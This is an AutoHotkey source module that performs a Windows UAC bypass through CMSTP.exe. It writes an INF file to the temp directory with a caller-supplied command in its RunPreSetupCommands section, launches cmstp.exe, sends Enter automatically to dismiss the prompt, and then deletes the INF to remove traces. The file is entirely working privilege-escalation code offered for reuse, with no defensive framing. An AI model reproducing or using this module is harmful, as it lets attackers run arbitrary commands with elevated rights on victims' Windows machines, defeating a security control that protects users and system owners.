; ============================================================================
; CMSTP UAC BYPASS MODULE
; ============================================================================
; Bypasses UAC using CMSTP.exe auto-elevation technique
; ============================================================================

CMSTP_UAC_Bypass(command){

    ; Use temp directory instead of Windows directory
    infPath := A_Temp "\cmstp.ini"

    ; INF file contents template
    infTemplate := "
    (
    [version]
    Signature=$chicago$
    AdvancedINF=2.5

    [DefaultInstall]
    CustomDestination=CustInstDestSectionAllUsers
    RunPreSetupCommands=RunPreSetupCommandsSection

    [RunPreSetupCommandsSection]
    {}
    taskkill /IM cmstp.exe /F

    [CustInstDestSectionAllUsers]
    49000,49001=AllUSer_LDIDSection, 7

    [AllUSer_LDIDSection]
    "HKLM", "SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\CMMGR32.EXE", "ProfileInstallPath", "%UnexpectedError%", ""

    [Strings]
    ServiceName="bypassit"
    ShortSvcName="bypassit"
    )"

    ; Format the template with the command and convert line endings
    infContents := StrReplace(Format(infTemplate, command), "`n", "`r`n")

    try {
        ; Write the INF file
        FileAppend(infContents, infPath)

        ; Run CMSTP
        Run('cmstp.exe /au "' infPath '"', A_WorkingDir, "Max")

        ; Delay
        Sleep(2000)
        Send("{Enter}")

        ; Allow sufficient time for CMSTP processing
        Sleep(5000)

        ; Clean up
        FileDelete(infPath)
    } catch as err {
        MsgBox("Error: " err.Message)
    }


}
